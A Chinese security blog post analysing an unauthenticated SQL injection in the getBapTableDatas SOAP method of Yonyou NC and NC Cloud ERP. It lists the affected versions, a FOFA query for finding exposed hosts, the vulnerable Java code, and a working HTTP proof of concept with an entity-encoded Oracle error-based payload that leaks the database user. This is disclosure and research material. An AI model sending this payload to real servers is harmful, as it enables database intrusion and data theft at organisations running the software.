---
title: "用友NC及NC Cloud系统 getBapTableDatas SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTableDatas-sqli.html
asset_dir: assets/用友nc及nc-cloud系统-getbaptabledatas-sql注入漏洞
---

# 用友NC及NC Cloud系统 getBapTableDatas SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/20 08:19
- 1201浏览
- [0评论](#comment)
- 46分钟阅读

深入探索

数据库

企业资源规划

企业资源计划

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友") NC [Cloud](#) 是一种商业级的[企业资源规划](#)云平台，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC Cloud nc.itf.bap.service.IBapIOService 接口的 `getBapTableDatas` 存在[SQL注入](https://mrxn.net/tag/SQL注入)漏洞，未授权的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。

云存储

# 影响版本

NC65、NCC1903、NCC1909、NCC2005、NCC2105、NCC2111

深入探索

服务器安全服务

安全运维咨询

安全研究报告

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

先看 `getBapTableDatas` 业务逻辑的实现

```
public BapTableData[] getBapTableDatas(String ... tableIds) throws Exception {
    PerfWatch pw = new PerfWatch(NCLangRes4VoTransl.getNCLangRes().getStrByID("8001006_0", "08001006-0275") + StringTools.arr2Str((Object[])tableIds, (String)","));
    try {
        if (ArrayUtils.isEmpty((Object[])tableIds)) {
            BapTableData[] bapTableDataArray = new BapTableData[]{};
            return bapTableDataArray;
        }
        ArrayList<BapTableData> dataList = new ArrayList<BapTableData>();
        for (String tableId : tableIds) {
            MetaTableDef tableDef = this.getMetaDef(tableId);
            if (tableDef == null) {
            ......
```

深入探索

文件大小转换

云安全解决方案

Web安全书籍

在判断传入的 `tableIds`不为空时，根据传入的多个 `tableId` 分别调用 `getMetaDef` 函数，其实现如下

SQL注入防护

```
private MetaTableDef getMetaDef(String tableId) throws SmartMetaException {
    Object[] splits = tableId.split("@");
    if (ArrayUtils.isEmpty((Object[])splits) || splits.length < 2) {
        String message = NCLangRes4VoTransl.getNCLangRes().getStrByID("8001006_0", "08001006-0273") + tableId;
        throw new RuntimeException(message);
    }
    MetaTableDef tableDef = SmartMetaUtilities.getSmartMetaService().getMetaTableByTableName((String)splits[1], (String)splits[0]);
    if (tableDef == null) {
    ......
```

`tableId` 参数的输入格式应为 `dsName@tableName`，即通过`@`符号将**数据源名称（dsName）**和**表名（tableName）**分隔的字符串。

然后将分割后的数组前两部分分别带入 `getMetaTableByTableName` 函数中，其实现如下

```
public MetaTableDef getMetaTableByTableName(String dsName, String tableName) throws SmartMetaException {
    if (StringUtils.isEmpty((String)tableName)) {
        return null;
    }
    String clause = " upper(tableid)='" + tableName.toUpperCase() + "' ";
    clause = StringUtils.isEmpty((String)dsName) ? clause + "and isnull(dsname,'~')='~' " : clause + "and upper(dsname)='" + dsName.toUpperCase() + "'";
    Object[] datas = new DAOAction().loadByClause(MetaTable.class, SmartConfigCache.getDsName4Design(), clause);
    MetaTable table = null;
```

- tableId[0] 对应 tableName
- tableId[1] 对应 dsName

需要满足 tableName 不为空，否则直接返回null ，其次是 dsName 的处理逻辑

代码安全审计

- 若`dsName`为空：添加条件`isnull(dsname,'~')='~'`，表示查询`dsname`为空的记录。
- 若`dsName`非空：添加条件`upper(dsname)=dsName.upper()`。

`tableName` 和 `dsName` 均是转为换大写后直接拼接进SQL语句中执行，无任何过滤，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

测试报错sql语句如下

```
SELECT guid,dsname,tableid,displayname,displayname2,displayname3,displayname4,displayname5,displayname6,moduleid,authtype,help,creationtime,modifiedtime,creator,modifier,pk_org,pk_group,dirguid,dr,ts,assetLayer,assetIndustry FROM bi_md_table WHERE  upper(tableid)='1' AND (SELECT DBMS_XDB_VERSION.CHECKIN((SELECT BANNER FROM SYS.V_$VERSION WHERE ROWNUM=1)) FROM DUAL) IS NOT NULL --' and upper(dsname)='XXX'
```

也是符合上面的漏洞分析部分

```
POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1
Host: ncc.mrxn.net
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
    <soapenv:Header/>
    <soapenv:Body>
        <gs:getBapTableDatas>
            <gs:stringarrayItem>&#x44;&#x57;&#x51;&#x75;&#x65;&#x75;&#x65;&#x40;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x51;&#x75;&#x65;&#x75;&#x65;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x31;&#x3d;&#x55;&#x54;&#x4c;&#x5f;&#x49;&#x4e;&#x41;&#x44;&#x44;&#x52;&#x2e;&#x47;&#x45;&#x54;&#x5f;&#x48;&#x4f;&#x53;&#x54;&#x5f;&#x41;&#x44;&#x44;&#x52;&#x45;&#x53;&#x53;&#x28;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x28;&#x75;&#x73;&#x65;&#x72;&#x29;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x29;&#x2d;&#x2d;&#x20;&#x61;&#x62;&#x63;
</gs:stringarrayItem>
        </gs:getBapTableDatas>
    </soapenv:Body>
</soapenv:Envelope>
```

成功利用报错注入得到数据库用户名

漏洞预警服务

[![用友NC及NC Cloud系统 getBapTableDatas SQL注入漏洞](images/img-001-2c557908675c.webp)](https://image.mrxn.net/d74780b797664910aac951180dfc576a.webp)

# 参考

- <https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTable-sqli.html>
- `https://security.yonyou.com/#/noticeInfo?id=401`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

数据管理
